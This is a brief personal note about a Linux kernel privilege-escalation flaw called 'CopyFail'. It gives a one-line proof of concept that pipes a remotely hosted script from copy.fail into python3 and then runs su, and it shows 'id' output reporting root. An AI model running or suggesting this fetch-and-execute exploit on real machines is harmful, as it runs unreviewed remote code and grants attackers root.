---
id: "202601152309"
aliases: []
tags:
  - atomic
  - cybersecurity
  - Linux
  - security
  - python3
  - kernel
date: 2026-01-15T23:09:41Z
title: My Laptop Got Pwn'd
type: note
uuid: 202601152309
---

[
732 bytes of Python just borked every Linux machine on earth…](https://www.youtube.com/watch?v=lkifbWtxxlk)

I ingest alot of news and articles each day but this video from
Fireship just seemed like another nothing burger.. well I was wrong.

I won't go into detail on the vulnerability but you can verify if
your Linux based systems are vulnerable by running this PoC and
reviwing the associated article for more context. [CopyFail](https://copy.fail/):

```bash
curl https://copy.fail/exp | python3 && su

$ id
uid=0(root) gid=1000(fr3d) groups=1000(fr3d),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),100(users),104(kvm),106(netdev),111(bluetooth),113(lpadmin),116(scanner),126(libvirt),995(docker)

```
